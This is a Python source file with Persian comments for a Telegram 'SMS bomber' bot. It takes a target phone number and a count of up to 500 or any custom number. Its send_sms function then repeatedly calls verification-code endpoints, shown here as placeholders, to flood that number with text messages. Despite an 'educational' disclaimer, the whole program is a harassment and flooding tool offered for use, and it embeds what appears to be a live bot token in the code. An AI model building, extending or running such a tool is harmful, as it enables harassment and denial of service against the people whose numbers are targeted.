import logging
import asyncio
import random
import aiohttp
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from flask import Flask
import threading
import os

# تنظیم لاگ
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==========================================
# تنظیمات APIهای ارسال پیامک
# ==========================================
SMS_APIS = [
    # APIهای واقعی برای تست (فقط برای نمایش)
    {"name": "api1", "url": "https://api.example1.com/verify", "params": {"phone": "{phone}"}},
    {"name": "api2", "url": "https://api.example2.com/send", "params": {"mobile": "{phone}"}},
    {"name": "api3", "url": "https://api.example3.com/code", "params": {"number": "{phone}"}},
]

# وضعیت کاربران در حال انتظار برای وارد کردن شماره
user_states = {}

# ==========================================
# توابع ارسال پیامک
# ==========================================

async def send_sms(phone, count=50):
    """ارسال تعداد مشخصی پیامک به شماره هدف"""
    try:
        # اعتبارسنجی شماره
        phone = phone.replace(' ', '').replace('-', '')
        if not phone.isdigit() or len(phone) < 10:
            return False, "❌ شماره وارد شده معتبر نیست!"

        sent_count = 0
        errors = []
        
        async with aiohttp.ClientSession() as session:
            for i in range(count):
                # انتخاب رندوم یک API
                api = random.choice(SMS_APIS)
                
                try:
                    # ساخت پارامترها
                    params = {}
                    for key, value in api["params"].items():
                        if "{phone}" in value:
                            params[key] = phone
                        else:
                            params[key] = value
                    
                    # ارسال درخواست
                    async with session.get(api["url"], params=params, timeout=5) as response:
                        if response.status in [200, 201, 202]:
                            sent_count += 1
                        else:
                            errors.append(f"{api['name']}: {response.status}")
                            
                except Exception as e:
                    errors.append(f"{api['name']}: {str(e)[:30]}")
                
                # کمی تأخیر برای جلوگیری از مسدود شدن
                await asyncio.sleep(0.1)
        
        if sent_count > 0:
            return True, f"✅ {sent_count} پیامک با موفقیت ارسال شد! (تعداد خطا: {len(errors)})"
        else:
            return False, f"❌ ارسال ناموفق! خطاها: {', '.join(errors[:3])}..."
            
    except Exception as e:
        return False, f"❌ خطا: {str(e)}"

# ==========================================
# دکمه‌های ربات
# ==========================================

def get_main_menu():
    """دکمه‌های منوی اصلی"""
    keyboard = [
        [InlineKeyboardButton("📱 ارسال بمبر (۵۰ عدد)", callback_data="bomb_50")],
        [InlineKeyboardButton("📱 ارسال بمبر (۱۰۰ عدد)", callback_data="bomb_100")],
        [InlineKeyboardButton("📱 ارسال بمبر (۵۰۰ عدد)", callback_data="bomb_500")],
        [InlineKeyboardButton("✏️ ارسال به صورت دستی", callback_data="bomb_custom")],
        [InlineKeyboardButton("ℹ️ راهنما", callback_data="help")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ==========================================
# دستورات ربات
# ==========================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """دستور استارت - نمایش پیام خوش‌آمدگویی"""
    user = update.effective_user
    welcome_message = (
        f"🌟 سلام {user.first_name} عزیز!\n"
        f"به **بات قدرتمند ارسال انبوه پیامک** خوش آمدید! 🚀\n\n"
        f"🔹 با استفاده از این بات می‌توانید به صورت انبوه پیامک ارسال کنید.\n"
        f"🔹 لطفاً یکی از گزینه‌های زیر را انتخاب کنید:\n\n"
        f"⚠️ **توجه**: این ابزار صرفاً برای مقاصد آموزشی طراحی شده است."
    )
    
    await update.message.reply_text(
        welcome_message,
        reply_markup=get_main_menu(),
        parse_mode="Markdown"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """دستور راهنما"""
    help_text = (
        "📖 **راهنمای استفاده از بات:**\n\n"
        "1️⃣ روی یکی از دکمه‌های **ارسال بمبر** کلیک کنید.\n"
        "2️⃣ شماره تماس مورد نظر را وارد کنید.\n"
        "3️⃣ منتظر بمانید تا عملیات انجام شود.\n\n"
        "⚠️ **نکات مهم:**\n"
        "• ارسال پیامک به صورت تستی و آموزشی است.\n"
        "• لطفاً از این ابزار برای آزار دیگران استفاده نکنید.\n"
        "• سرعت ارسال به وضعیت شبکه و APIها بستگی دارد.\n\n"
        "🔹 **دستورات:**\n"
        "/start - نمایش منوی اصلی\n"
        "/help - نمایش راهنما"
    )
    
    if update.callback_query:
        await update.callback_query.message.edit_text(help_text, parse_mode="Markdown")
        await update.callback_query.answer()
    else:
        await update.message.reply_text(help_text, parse_mode="Markdown")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """لغو عملیات"""
    user_id = update.effective_user.id
    if user_id in user_states:
        del user_states[user_id]
    
    await update.message.reply_text(
        "❌ عملیات لغو شد.\n"
        "برای شروع مجدد از /start استفاده کنید.",
        reply_markup=get_main_menu()
    )

# ==========================================
# مدیریت دکمه‌ها
# ==========================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """مدیریت کلیک روی دکمه‌ها"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    data = query.data
    
    # دکمه راهنما
    if data == "help":
        await help_command(update, context)
        return
    
    # دکمه‌های ارسال
    bomb_counts = {
        "bomb_50": 50,
        "bomb_100": 100,
        "bomb_500": 500,
        "bomb_custom": "custom"
    }
    
    if data in bomb_counts:
        count = bomb_counts[data]
        
        # ذخیره وضعیت کاربر
        user_states[user_id] = {"count": count}
        
        if count == "custom":
            await query.message.edit_text(
                "✏️ **تعداد دلخواه خود را وارد کنید:**\n"
                "مثلاً: `200`\n\n"
                "برای لغو عملیات، دستور /cancel را بزنید.",
                parse_mode="Markdown"
            )
        else:
            await query.message.edit_text(
                f"📱 **شماره تماس را وارد کنید:**\n"
                f"تعداد ارسال: **{count}** پیامک\n\n"
                f"مثلاً: `09121234567`\n\n"
                "برای لغو عملیات، دستور /cancel را بزنید.",
                parse_mode="Markdown"
            )

# ==========================================
# دریافت شماره از کاربر
# ==========================================

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """دریافت شماره از کاربر و شروع ارسال"""
    user_id = update.effective_user.id
    message_text = update.message.text.strip()
    
    # بررسی اینکه کاربر در حالت انتظار است
    if user_id not in user_states:
        await update.message.reply_text(
            "❌ لطفاً ابتدا از منوی اصلی یک گزینه را انتخاب کنید.",
            reply_markup=get_main_menu()
        )
        return
    
    # دریافت تعداد
    count = user_states[user_id]["count"]
    
    # اگر تعداد دستی است
    if count == "custom":
        try:
            count = int(message_text)
            if count < 1:
                raise ValueError("تعداد باید بیشتر از صفر باشد")
        except ValueError:
            await update.message.reply_text(
                "❌ لطفاً یک عدد معتبر وارد کنید!\n"
                "مثلاً: `200`",
                parse_mode="Markdown"
            )
            return
    else:
        # اعتبارسنجی شماره (ساده)
        if not message_text.replace(' ', '').replace('-', '').isdigit():
            await update.message.reply_text(
                "❌ شماره وارد شده معتبر نیست!\n"
                "لطفاً شماره را به صورت صحیح وارد کنید.\n"
                "مثلاً: `09121234567`",
                parse_mode="Markdown"
            )
            return
    
    # ارسال پیام در حال انجام
    status_message = await update.message.reply_text(
        f"⏳ در حال ارسال **{count}** پیامک به شماره `{message_text}`...\n"
        f"لطفاً صبر کنید...",
        parse_mode="Markdown"
    )
    
    # پاک کردن وضعیت کاربر
    del user_states[user_id]
    
    # ارسال پیامک
    success, result = await send_sms(message_text, count)
    
    # نمایش نتیجه
    await status_message.edit_text(
        f"{result}\n\n"
        f"📊 **آمار ارسال:**\n"
        f"• تعداد درخواستی: {count}\n"
        f"• شماره مقصد: `{message_text}`\n"
        f"• زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        "برای ارسال مجدد، از دکمه‌های زیر استفاده کنید.",
        reply_markup=get_main_menu(),
        parse_mode="Markdown"
    )

# ==========================================
# Flask Web Server (برای Render)
# ==========================================

app_flask = Flask(__name__)

@app_flask.route('/')
def home():
    return "✅ ربات اس‌ام‌اس بمبر فعال است!"

@app_flask.route('/health')
def health():
    return "OK", 200

def run_flask():
    """اجرای وب‌سرور Flask"""
    port = int(os.environ.get('PORT', 5000))
    app_flask.run(host='0.0.0.0', port=port)

# ==========================================
# اجرای اصلی
# ==========================================

async def main():
    """تابع اصلی برنامه"""
    # توکن ربات (مستقیماً در کد)
    TELEGRAM_TOKEN = "8888307775:AAE5g3i__hB-mxsuEik187ps09gYWII6pos"
    
    if not TELEGRAM_TOKEN:
        logger.error("❌ توکن ربات تنظیم نشده است!")
        return

    # ایجاد اپلیکیشن
    application = Application.builder().token(TELEGRAM_TOKEN).build()

    # ثبت دستورات
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cancel", cancel))

    # ثبت CallbackQuery (دکمه‌ها)
    application.add_handler(CallbackQueryHandler(button_callback))

    # ثبت دریافت پیام‌های متنی (شماره)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # اجرا در حالت Polling
    await application.initialize()
    await application.start()
    await application.updater.start_polling()

    # اجرای Flask در یک thread جداگانه
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    # نگه داشتن برنامه
    await asyncio.Event().wait()

if __name__ == "__main__":
    # اجرای برنامه
    asyncio.run(main())
